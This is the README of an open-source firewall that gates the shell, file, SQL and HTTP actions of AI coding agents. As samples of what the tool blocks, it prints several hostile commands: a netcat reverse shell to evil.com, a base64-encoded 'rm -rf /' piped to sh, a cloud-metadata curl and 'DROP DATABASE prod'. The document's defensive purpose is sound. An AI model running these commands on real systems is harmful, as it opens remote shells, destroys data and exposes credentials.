<div align="center">

<img src="https://raw.githubusercontent.com/Shahriyar-Khan27/ai_firewall/main/assets/logo.png" alt="AI Execution Firewall" width="120" height="120" />

# AI Execution Firewall

### A deterministic policy gate for every action an AI agent executes.

Inspect, classify, and approve every shell command, file edit, SQL query, and HTTP request before it reaches the operating system. Risky actions raise an in-editor approval prompt; routine ones pass silently.

[![PyPI](https://img.shields.io/pypi/v/ai-execution-firewall.svg)](https://pypi.org/project/ai-execution-firewall/)
[![VS Marketplace](https://vsmarketplacebadges.dev/version-short/sk-dev-ai.ai-execution-firewall.png?label=VS%20Marketplace)](https://marketplace.visualstudio.com/items?itemName=sk-dev-ai.ai-execution-firewall)
[![License: MIT](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
[![CI](https://github.com/Shahriyar-Khan27/ai_firewall/actions/workflows/ci.yml/badge.svg)](https://github.com/Shahriyar-Khan27/ai_firewall/actions/workflows/ci.yml)
[![GitHub stars](https://img.shields.io/github/stars/Shahriyar-Khan27/ai_firewall?style=social)](https://github.com/Shahriyar-Khan27/ai_firewall/stargazers)

</div>

AI coding agents (Claude Code, Cursor, Copilot, Continue, Cline, Zed) increasingly execute commands, edit files, and call APIs without operator review. AI Execution Firewall sits between those agents and the host system and enforces a deterministic policy on every action. Every request is classified, scored for risk, simulated for impact, and matched against YAML rules before it can run. Risky actions either block, or open an approval surface (CLI prompt or VS Code webview) showing the diff, the findings, and explicit Approve / Reject controls.

Open source under the MIT license. 457 passing tests. Compatible with Claude Code, Cursor, Continue, Cline, Zed, and any MCP-aware host.

```text
$ guard run "pip install requets"
[FIREWALL] BLOCK: possible typosquat of `requests`

$ guard scan "my SSN is 123-45-6789"
severity: critical
  - PII: US SSN detected

$ guard run "curl http://169.254.169.254/"
[FIREWALL] BLOCK: cloud metadata endpoint, credential exfil risk

$ guard run "rm -rf ./build"           # action issued by an AI agent in auto-mode
[FIREWALL] REQUIRE_APPROVAL: 47 files affected, uncommitted changes
           Approval webview opened in VS Code. Operator selects Reject.
[FIREWALL] BLOCK: rejected by operator via extension
```

## What it catches

| Threat | Firewall outcome |
|---|---|
| AI agent issues `pip install requets` (typosquat). | BLOCK. Typosquat of `requests` flagged via the PyPI registry check and Damerau-Levenshtein comparison against the top-100 packages. |
| AI agent issues `curl http://169.254.169.254/` to reach a cloud metadata endpoint. | BLOCK. Endpoint classified as CRITICAL risk; credential exfiltration vector. |
| AI agent issues 25 file deletes in 60 seconds in a stuck loop. | REQUIRE_APPROVAL. Behaviour anomaly: rate burst threshold exceeded. |
| AI agent emits an AWS access key in a request body, log entry, or pasted text. | Detected by the secret scanner; surfaced before the request leaves the host. |
| AI agent attempts to delete an unfamiliar build directory. | Approval webview opens with the unified diff and impact summary. Operator decision is recorded in memory; future identical actions auto-approve. |

```
AI > Action > Firewall > Decision > Execution
```

The firewall classifies intent, scores risk, applies YAML rules, simulates impact (unified diff for code, SQL AST findings, git context, SSRF and leaked-secret detection for URLs), and returns one of `ALLOW`, `BLOCK`, or `REQUIRE_APPROVAL`. Every decision is appended to an audit log.

> **Capabilities.** Semantic command parsing with obfuscation decoding; approved-pattern memory; permission inheritance from the host shell history; HMAC-signed audit trails; Docker sandbox dry-run; MCP transparent proxy; AI-SBOM validation against PyPI, npm, crates.io, and RubyGems; DLP for secrets and PII; network egress control; fine-grained RBAC via guard.toml; rule-based behaviour anomaly detection; SIEM-ready audit sinks; rate limiting, loop detection, and a daily API-byte budget; automatic detection and integration of Claude Code, Cursor, Continue, Cline, and Zed. Full release notes in [CHANGELOG.md](CHANGELOG.md).

## Install

**Python package** ([PyPI](https://pypi.org/project/ai-execution-firewall/)):

```bash
pip install ai-execution-firewall
```

**VS Code extension** ([Marketplace](https://marketplace.visualstudio.com/items?itemName=sk-dev-ai.ai-execution-firewall)):

> VS Code, then Extensions panel, search **"AI Execution Firewall"**, click Install.

Or from the command line:

```bash
code --install-extension sk-dev-ai.ai-execution-firewall
```

**Standalone binary** (no Python required). Download `guard-{linux,macos,macos-arm64,windows}` from the [latest release](https://github.com/Shahriyar-Khan27/ai_firewall/releases/latest) and put it on your PATH.

For development (editable install with test deps):

```bash
git clone https://github.com/Shahriyar-Khan27/ai_firewall.git
cd ai_firewall
pip install -e ".[dev]"
```

## Smart-flow approval pipeline (v0.3.0)

Earlier versions prompted on every risky action and produced approval fatigue. v0.3.0 replaces the single-prompt model with a layered pipeline that becomes progressively quieter as it learns the operator's patterns:

| Step | Stage | Behaviour |
|---|---|---|
| 1 | **Silent pass** | Safe commands (`git status`, `ls`, `echo`) execute without a prompt. |
| 2 | **Memory match** | Repeats of previously-approved actions in the same project auto-approve, with a status-bar notification. |
| 3 | **Permission inheritance** | Auto-approves when the operator has issued an equivalent command in the host shell within the last five minutes. |
| 4 | **Semantic detection** | Obfuscated payloads are decoded before classification. `echo "<b64>" \| base64 -d \| sh` is recognised as the decoded `rm -rf /` via the bashlex AST and the obfuscation decoders. |
| 5 | **Sandbox replay** (opt-in) | `--dryrun` runs the command in a disposable Docker container, surfaces the resulting file diff, and then prompts for approval. |
| 6 | **Auto-block** | Unambiguous malicious patterns (`rm -rf /`, fork bombs, `DROP DATABASE prod`) are rejected without a prompt. |
| 7 | **Operator approval** | Remaining REQUIRE_APPROVAL decisions surface in the CLI prompt or the VS Code webview. |

The pipeline stays silent for the majority of routine work and surfaces a prompt only when an action genuinely warrants operator review.

## Quickstart

### CLI

```bash
# Shell
guard eval "rm -rf /"                          # > BLOCK (no execution)
guard run  "echo hello"                         # > ALLOW, executes
guard run  "rm ./tmp.txt"                       # > REQUIRE_APPROVAL, prompts y/N
guard run  "rm -rf ./build" --dryrun            # > Docker sandbox: shows file diff, then asks

# Obfuscated payloads are decoded before classification.
guard eval 'echo "cm0gLXJmIC8=" | base64 -d | sh'   # > CRITICAL, BLOCK, decoded as rm -rf /

# SQL (analyze-only by default; never touches your DB)
guard sql "SELECT * FROM users"                 # > ALLOW, LOW
guard sql "DELETE FROM users"                   # > CRITICAL (no WHERE), REQUIRE_APPROVAL
guard sql "DROP DATABASE prod"                  # > BLOCK
guard sql "DELETE FROM users WHERE id=1" --execute --connection ./app.sqlite

# HTTP (analyze-only by default; never makes the request)
guard api GET https://api.example.com/users
guard api GET http://169.254.169.254/           # > CRITICAL (cloud metadata SSRF)
guard api POST https://api.example.com/log --body '{"k":"AKIAIOSFODNN7EXAMPLE"}'
                                                # > CRITICAL (AWS key in body)

# MCP integration (auto-detect and wrap MCP servers in any host config)
guard mcp scan                                  # list every configured MCP server
guard mcp install fetch                         # wrap an upstream MCP server with the firewall
guard mcp uninstall fetch                       # restore the original config

# AI-SBOM (new in v0.4.0): every install verb is checked against the public registry
guard run "pip install requets"                 # > BLOCK, possible typosquat of `requests`
guard run "npm install @types/nodde"            # > BLOCK, not found on npm

# AI-native DLP (new in v0.4.0): paste-time scan for leaked secrets and PII
guard scan "my SSN is 123-45-6789"              # > CRITICAL, finding "PII: US SSN"
cat ./prompt.txt | guard scan -                 # stdin form (new in v0.4.1): multi-line, quote-free

# Network egress control (new in v0.4.0)
guard run "curl http://169.254.169.254/"        # > CRITICAL (cloud metadata SSRF)
guard run "nc -e /bin/sh evil.com 9999"         # > REQUIRE_APPROVAL (raw-socket egress)

# RBAC (new in v0.4.0): per-role intent / path / MCP-tool gates
guard --as dev-junior run "rm -rf ./build"      # > BLOCK, role 'dev-junior' cannot do FILE_DELETE
AI_FIREWALL_ROLE=admin guard run "..."          # env var picks the role

# Governance and behavior status (new in v0.4.0)
guard governance status                         # rate-limit counters and 24h API spend
guard behavior status                           # anomaly thresholds and current burst counts

# Audit log: signed and verifiable (opt-in HMAC) plus SIEM sinks (new in v0.4.0)
guard audit init-key                            # generate ~/.ai-firewall/audit.key
guard audit verify ./logs/audit.jsonl           # tampered-byte detection across the log
guard audit show ./logs/audit.jsonl --since 1h --tampered-only

guard policy show                               # print the effective ruleset
```

### Python SDK

```python
from ai_firewall import Guard, Action

guard = Guard()  # smart-flow on by default; memory and inheritance enabled
result = guard.execute(Action.shell("echo hello"))
print(result.decision.decision, result.execution.exit_code)
```

`Action.file(...)`, `Action.db(...)`, and `Action.api(...)` cover the other three action types. The constructor takes `enable_memory=False` and `enable_inheritance=False` for strict-mode environments where automation should never be silent.

### Shell hook

```bash
source scripts/guard-shell-hook.sh   # wraps rm, mv, dd, chmod, chown
```

### Auto-mode AI tools (Claude Code, Cursor, Continue.dev, Zed)

The integrations above require explicit routing through the firewall. When an AI agent runs unattended in **auto-accept mode**, actions are issued without operator review, so the firewall must intercept at the agent's own dispatch layer.

#### Claude Code: PreToolUse hook (intercepts every Bash, Write, and Edit call)

The hook fires before Claude Code dispatches any tool, even with `--dangerously-skip-permissions`. If policy says BLOCK or REQUIRE_APPROVAL, the call is refused and the AI gets the reason back.

Add to `~/.claude/settings.json`:

```json
{
  "hooks": {
    "PreToolUse": [{
      "matcher": "Bash|Write|Edit|MultiEdit|NotebookEdit",
      "hooks": [{
        "type": "command",
        "command": "python /absolute/path/to/ai_firewall/scripts/claude-code-pretooluse.py"
      }]
    }]
  }
}
```

A copyable example lives at [examples/claude-code-settings.json](examples/claude-code-settings.json).

#### MCP: wrap any MCP-capable host (Claude Code, Cursor, Continue, Zed, Cline, ...)

```bash
pip install "ai-execution-firewall[mcp]"
```

**Manual** (drop in your client's mcp.json):

```json
{
  "mcpServers": {
    "ai-firewall": {"command": "guard", "args": ["mcp"]}
  }
}
```

**Automatic.** Let the firewall scan and wrap your existing MCP servers:

```bash
guard mcp scan                # list what is configured
guard mcp install fetch       # rewrites the mcp.json to route 'fetch' through the firewall
```

After wrapping, every `tools/call` JSON-RPC request from the host runs through `Guard.evaluate` first. BLOCK and REQUIRE_APPROVAL responses are returned to the host as tool errors; the upstream MCP server is never reached for risky calls. Heuristic argument-shape mapping handles the common conventions (`command`, `file_path`, `sql`, `url`).

### VS Code extension

On first activation the extension detects every AI tool configured on the host (Claude Code via `~/.claude/settings.json`, MCP-aware hosts via `guard mcp scan --json`) and offers a single notification to wire firewall protection into each of them. From that point, any agent action that hits REQUIRE_APPROVAL opens the approval webview automatically; no manual command invocation is required. *(new in v0.5.0)*

The Command Palette (Ctrl+Shift+P) exposes the following commands under `AI Firewall:`

- **Detect & Wire AI Tools** / **Unwire All AI Tools** *(new in v0.5.0)*: re-arm or reverse the auto-wire flow.
- **Show Status** *(new in v0.5.0)*: markdown summary of wired hosts plus the last 20 audit decisions.
- **Run Shell Command...** / **Evaluate Selected Text as Shell Command**.
- **Evaluate SQL Query...** / **Evaluate Selected Text as SQL**.
- **Evaluate HTTP Request...**
- **Show Effective Policy**.
- **Show Recent Secret-DB Activity** *(v0.3.0; passive watcher for `state.vscdb` modifications)*.
- **Scan Text for Secrets and PII...** / **Scan Selection for Secrets and PII** *(v0.4.0)*.
- **Show Governance Status** / **Show Behavior Status** *(v0.4.0)*.

Risky actions open a themed approval webview containing the risk badge, intent and decision pills, the findings list, the git context, and a syntax-coloured unified diff. Smart-flow auto-approvals (memory or inheritance match) instead surface a status-bar message and proceed without opening the webview. See [vscode-extension/README.md](vscode-extension/README.md) for build, debug, and packaging instructions.

## Pipeline

Every `guard.execute(action)` call runs:

1. **RBAC pre-pass** *(new in v0.4.0)*: load `~/.ai-firewall/guard.toml` (or per-project `.guard.toml`), pick the active role (priority: `--as` flag, then `AI_FIREWALL_ROLE` env, then `default_role`, then `"dev"`), and check intent / file glob / MCP-tool deny lists. DENY is a final BLOCK.
2. **Governance pre-pass** *(new in v0.4.0)*: rolling-window check on the audit log. Rate limit per intent, loop detection (same normalised command repeated), and 24h API-byte budget. BLOCK on first violation.
3. **Intent classifier**: bashlex AST, SQL parse, or URL parse, mapped to one of `FILE_DELETE | FILE_WRITE | FILE_READ | SHELL_EXEC | CODE_MODIFY | DB_READ | DB_WRITE | DB_DESTRUCTIVE | API_READ | API_WRITE | API_DESTRUCTIVE | NETWORK_EGRESS`. Multi-command shells take the worst of every effective command; obfuscation (base64 / hex / printf decoding) bumps a baseline HIGH risk regardless of what is inside; `curl`, `wget`, `nc`, `socat`, and `scp` route to API_* / NETWORK_EGRESS *(new in v0.4.0)*.
4. **Risk analyzer**: table lookup on intent plus feature flags, mapped to `LOW | MEDIUM | HIGH | CRITICAL`.
5. **Policy engine**: YAML rules mapped to `ALLOW | BLOCK | REQUIRE_APPROVAL` (first pass).
6. **Impact engine**: best-effort dry-run.
   - **Files**: glob expansion, file stat, **unified diff**, **AST findings** (removed funcs and tests, auth identifiers), **git context** (uncommitted, untracked, gitignored).
   - **SQL**: `sqlglot` AST detects DELETE/UPDATE without WHERE, DROP DATABASE/SCHEMA/TABLE, TRUNCATE, GRANT/REVOKE, multiple statements.
   - **HTTP**: cloud metadata endpoints, private/loopback hosts (SSRF), URL credentials, secrets in query string, non-HTTP schemes, destructive paths. Body and Authorization-header secret scanning plus **PII scanning** *(v0.4.0 DLP: emails, US SSN, Luhn-validated CCs, E.164/US phone, IBAN, high-entropy tokens)*. Body and headers checked for AWS, GitHub, Slack, Stripe, Google, Anthropic, OpenAI, PEM keys, and JWTs.
   - **Shell installs** *(new in v0.4.0)*: `pip install`, `npm install`, `cargo install`, and `gem install` verify the package against the public registry. Unknown packages flag CRITICAL; typosquats of top-100 packages flag HIGH.
7. **Risk bump**: impact findings can raise risk and re-trigger policy.
8. **Smart-flow** *(v0.3.0)*: when policy says REQUIRE_APPROVAL, check **inheritance** (did the user just run an equivalent command in their own terminal?) and **memory** (have they approved this kind of thing in this project before?). Either match downgrades to ALLOW with a status-bar toast. BLOCK is never downgraded.
9. **Behavior pass** *(new in v0.4.0)*: three rule-based heuristics on the audit log. Rate burst (per-intent count in N seconds), rate spike (last hour vs 24h median), and quiet-hour outlier (intent appearing in a historically-zero hour-of-day). An anomaly *downgrades* ALLOW into REQUIRE_APPROVAL; it never escalates BLOCK or upgrades approval.
10. **Decision engine**: combines verdict, risk, and impact.

`BLOCK` raises immediately. `REQUIRE_APPROVAL` invokes the approval function (CLI prompt or VS Code webview). `ALLOW` runs through the matching adapter.

Every evaluated action is appended to `logs/audit.jsonl`. Records are optionally HMAC-SHA256 signed (see `guard audit init-key`) and broadcast to any configured **SIEM sinks** *(new in v0.4.0: syslog, Splunk HEC, generic HTTPS webhook, or stdout, all async with bounded queues)*.

## Adapters

| Action type | Default adapter | Opt-in execute adapter |
|---|---|---|
| `shell` | `ShellAdapter` (subprocess) | `DockerSandboxAdapter` via `--dryrun` (Feature F) |
| `file` | `FileAdapter` (pathlib) | (none) |
| `db` | `DBAnalyzeAdapter` (never opens a DB) | `SQLiteExecuteAdapter` via `--execute --connection <sqlite-path>` |
| `api` | `APIAnalyzeAdapter` (never sends a request) | `HTTPExecuteAdapter` via `--execute` (stdlib `urllib`) |

DB and API default to **analyze-only** so the firewall never touches your database or network unless you explicitly opt in. Sandbox dry-run is opt-in for shell. It runs your command in a disposable container against a snapshot of the workdir, then surfaces the file diff before letting you confirm.

## Custom rules

Pass `--rules path/to/rules.yaml` (CLI) or `Guard(rules_path=...)` (SDK). See [`ai_firewall/config/default_rules.yaml`](ai_firewall/config/default_rules.yaml) for the schema:

```yaml
shell_exec:
  blocked:
    - 'rm\s+-rf\s+/'
  require_approval:
    risk_at_or_above: HIGH

file_delete:
  require_approval: true

db_destructive:
  blocked:
    - 'DROP\s+DATABASE'
  require_approval: true

api_destructive:
  require_approval: true
```

## Scope

**Shipped (v0.5.0):**

- **Phase 1**: shell and filesystem, rule-based classifier, CLI prompt approval, CLI / SDK / shell-hook surfaces.
- **Phase 2**: unified diff for code edits, AST-aware risk findings, git-aware impact, VS Code extension with webview approval UI.
- **Phase 3**: SQL gating via `sqlglot`, HTTP gating via stdlib `urllib`, secret-scanning of request bodies and Authorization-style headers, opt-in execute adapters for SQLite and HTTP.
- **v0.3.0 (smart-flow and distribution)**:
  - Semantic command parsing (bashlex) with obfuscation decoding.
  - Approved-pattern memory (project-scoped, risk-gated, 0.8 Jaccard or higher).
  - Permission inheritance from bash, zsh, fish, and PowerShell history.
  - HMAC-SHA256-signed audit trails plus `guard audit verify`.
  - Docker sandbox replay (`--dryrun`).
  - MCP transparent proxy with auto-detect (`guard mcp install/uninstall`).
  - PyInstaller standalone binary (no Python prerequisite).
  - VS Code passive Cursor secret-DB watcher.
- **v0.4.0 (enterprise round, single release, 7 features)**:
  - **AI-SBOM** validation against PyPI, npm, crates.io, and RubyGems with Damerau-Levenshtein typosquat detection.
  - **AI-native DLP**: PII scanner (email, US SSN, Luhn-validated CCs, E.164/US phone, IBAN, high-entropy tokens) bolted onto every existing secret-scan channel; new `guard scan` CLI for paste-time checks.
  - **Network egress control**: `curl`, `wget`, and `httpie` route through the API gate; `nc`, `socat`, `telnet`, `scp`, and `rsync` classify as `NETWORK_EGRESS`.
  - **Fine-grained RBAC**: `~/.ai-firewall/guard.toml` (and per-project `.guard.toml` override) with role inheritance, intent / file-glob / MCP-tool allow-deny lists, and `--as <role>` flag.
  - **Behavior analytics**: three rule-based anomaly heuristics (rate burst, rate spike, quiet-hour outlier) reading the audit log. Only ever *downgrades* ALLOW to REQUIRE_APPROVAL.
  - **SIEM-ready audit sinks**: `JsonlFileSink` (default, sync) plus async `SyslogSink` (RFC 5424), `SplunkHECSink`, `HttpsSink`, and `StdoutSink` (vector / fluent-bit pipe), all bounded-queue with daemon workers.
  - **Cost and resource governance**: per-intent rate limits, loop detection (same normalised command repeated), and a 24h API-byte budget. `guard governance status` and `guard behavior status` CLIs.
- **v0.5.0 (active interceptor)**:
  - Loopback approval bridge (`127.0.0.1` HTTP server with token auth via `~/.ai-firewall/extension.port`).
  - Auto-detect and one-click wire of Claude Code, Cursor, Continue, Cline, and Zed.
  - `guard mcp install-hook` / `uninstall-hook` and `guard mcp scan --json`.
  - `guard audit show --json --limit N`.

**Out of scope, future work:**

- Postgres and MySQL execute adapters (currently SQLite only).
- Firecracker and gVisor sandbox backends (Docker first).
- Cloud control plane and web dashboard.
- Team policy distribution.
- LLM SDK middleware-style DLP (intercept `openai.chat.completions.create()` directly).
- Statistical and ML-based behavior models (per-project z-score baselines, trained anomaly detectors).
- OS-level network firewall integration (iptables, Windows Filter Platform).

## Tests

```bash
pytest -q
```

457 tests plus 1 skipped (Docker round-trip skips when no daemon). CI runs the full suite on Python 3.11, 3.12, and 3.13 on every push, plus PyInstaller binary builds on tag push.

## Release flow

Pushing a tag matching `v*` automatically:

1. Runs the full test matrix on GitHub Actions.
2. Builds sdist plus wheel.
3. Publishes to PyPI via Trusted Publishing (no API token in CI).
4. Builds standalone PyInstaller binaries for Linux, macOS, macOS-arm64, and Windows, and attaches them to the GitHub release.

```bash
# Bump version in pyproject.toml + ai_firewall/__init__.py, refresh
# README.md and CHANGELOG.md, commit, then:
git tag -a v0.4.0 -m "v0.4.0"
git push --tags
# PyPI is updated within ~60 seconds; binaries within ~5 minutes.
```

VS Code Marketplace publishing is currently manual. Re-build the `.vsix` (`npx vsce package --no-yarn` from `vscode-extension/`) and upload via the [Marketplace publisher manage page](https://marketplace.visualstudio.com/manage/publishers/sk-dev-ai).

## Security

If you discover a vulnerability (a bypass of the firewall, a regex-DoS in a scanner, a prompt-injection that disables a check, or similar), please do not open a public issue. File it privately via [GitHub Security advisories](https://github.com/Shahriyar-Khan27/ai_firewall/security/advisories/new) to allow responsible coordination of a fix and disclosure.

Non-sensitive bugs and feature requests belong on the public issues tracker; see Contributing below.

## Contributing

This project is fully open source under the MIT license. Contributions of any size are welcome.

**Good first issues to pick up:**

- New SBOM registries (Composer, NuGet, Go modules) extend [`ai_firewall/engine/package_registry.py`](ai_firewall/engine/package_registry.py).
- Postgres and MySQL execute adapters. SQLite is currently the only real-execute path.
- Additional MCP host detectors. Zed, Cline, and Aider have evolving config layouts.
- Translations and docs polish in README, CHANGELOG, and in-CLI help.
- New PII patterns extend [`ai_firewall/engine/pii_scan.py`](ai_firewall/engine/pii_scan.py). Regex plus Luhn-style validators welcome.
- Statistical and ML behaviour models on top of the audit log. `engine/behavior.py` is currently rule-based.

**How to contribute:**

```bash
git clone https://github.com/Shahriyar-Khan27/ai_firewall.git
cd ai_firewall
pip install -e ".[dev]"
pytest -q       # confirm 457 tests pass
# make your change, add a test, push a branch, open a PR
```

Run `pytest` before opening a PR. CI re-runs the suite on Python 3.11, 3.12, and 3.13. New features ship with tests; regressions block merge.

**Bugs, questions, and feature requests:** open an issue at <https://github.com/Shahriyar-Khan27/ai_firewall/issues>. For security findings, refer to the Security section above.

## Links

- **PyPI**: <https://pypi.org/project/ai-execution-firewall/>
- **VS Code Marketplace**: <https://marketplace.visualstudio.com/items?itemName=sk-dev-ai.ai-execution-firewall>
- **GitHub repo**: <https://github.com/Shahriyar-Khan27/ai_firewall>
- **GitHub releases**: <https://github.com/Shahriyar-Khan27/ai_firewall/releases>
- **Issues**: <https://github.com/Shahriyar-Khan27/ai_firewall/issues>
- **CHANGELOG**: [CHANGELOG.md](CHANGELOG.md)

## License

MIT. See [LICENSE](LICENSE). Free for commercial and personal use, in any context, with attribution.
